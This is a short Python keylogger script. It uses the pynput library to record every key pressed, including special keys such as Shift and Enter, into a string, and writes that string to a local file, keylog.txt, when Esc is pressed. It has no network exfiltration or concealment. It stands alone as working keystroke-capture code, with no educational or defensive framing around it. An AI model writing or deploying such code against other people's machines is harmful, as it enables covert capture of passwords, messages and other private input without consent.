import pynput.keyboard

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        # Handle special keys (e.g., Enter, Shift, etc.)
        log += f" {key} "

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # Stop the keylogger on pressing the Esc key
        write_log()
        return False

def write_log():
    global log
    with open("keylog.txt", "w") as f:
        f.write(log)

# Set up the listener
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
